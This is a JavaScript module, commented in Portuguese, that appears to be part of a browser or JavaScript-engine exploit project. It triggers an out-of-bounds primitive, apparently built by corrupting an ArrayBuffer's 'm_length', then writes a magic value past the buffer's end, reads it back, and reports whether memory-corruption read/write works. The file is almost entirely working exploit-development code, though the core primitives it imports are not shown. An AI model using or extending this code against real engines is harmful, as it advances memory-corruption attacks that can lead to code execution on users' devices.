// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v33: Teste Direto de R/W Fora dos Limites)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    getOOBAllocationSize,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs'; // Usando as primitivas de OOB absoluto

// O nome do módulo foi atualizado para refletir o novo teste.
export const FNAME_MODULE = "OutOfBoundsRWTest_v33";

/**
 * Executa um teste para verificar se é possível ler e escrever
 * em um offset imediatamente fora dos limites do ArrayBuffer original.
 */
export async function executeOutOfBoundsReadWriteTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE}.runTest`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Verificação de Leitura/Escrita Fora dos Limites ---`, "test", FNAME_CURRENT_TEST);

    let testResult = {
        success: false,
        message: "Teste não iniciado."
    };

    try {
        // PASSO 1: Inicializar o ambiente OOB
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha crítica ao configurar o ambiente OOB. O exploit não funcionará.");
        }
        logS3("Ambiente OOB configurado com sucesso. A corrupção de 'm_length' foi bem-sucedida.", "good", FNAME_CURRENT_TEST);

        // PASSO 2: Obter o tamanho real do buffer e definir um alvo fora dele
        const realBufferSize = getOOBAllocationSize();
        const test_offset = realBufferSize + 0x10; // Alvo: 16 bytes APÓS o final real do buffer
        const test_value = 0xDEADBEEF; // Um valor "mágico" para teste

        logS3(`Tamanho real do ArrayBuffer: ${toHex(realBufferSize)}`, "info", FNAME_CURRENT_TEST);
        logS3(`Tentando escrever o valor ${toHex(test_value)} em um offset fora dos limites: ${toHex(test_offset)}`, "warn", FNAME_CURRENT_TEST);

        // PASSO 3: Escrever fora dos limites usando a primitiva de OOB absoluto
        // Nota: Usamos 'oob_write_absolute' pois operamos em um offset relativo ao buffer, não um endereço de memória absoluto.
        oob_write_absolute(test_offset, test_value, 4);
        logS3("Escrita OOB realizada. Tentando ler o valor de volta...", "info", FNAME_CURRENT_TEST);

        // PASSO 4: Ler de volta do mesmo local fora dos limites
        const read_value = oob_read_absolute(test_offset, 4);
        logS3(`Valor lido do offset ${toHex(test_offset)}: ${toHex(read_value)}`, "leak", FNAME_CURRENT_TEST);

        // PASSO 5: Verificar se o valor lido corresponde ao valor escrito
        if (read_value === test_value) {
            testResult.success = true;
            testResult.message = `SUCESSO! O valor ${toHex(test_value)} foi escrito e lido corretamente fora dos limites do buffer.`;
            logS3(testResult.message, "vuln", FNAME_CURRENT_TEST);
        } else {
            testResult.success = false;
            testResult.message = `FALHA! Esperado: ${toHex(test_value)}, Lido: ${toHex(read_value)}. A escrita/leitura OOB não funcionou como esperado.`;
            logS3(testResult.message, "error", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        testResult.success = false;
        testResult.message = `Erro crítico durante o teste: ${e.message}`;
        logS3(testResult.message, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(e.stack, "critical", FNAME_CURRENT_TEST);

    } finally {
        // Limpa o ambiente para evitar instabilidade
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3("Ambiente OOB limpo.", "info", FNAME_CURRENT_TEST);
    }

    logS3(`--- Teste ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    
    // O runner espera um objeto aninhado, então encapsulamos o resultado.
    return { exploit_attempt_result: testResult };
}
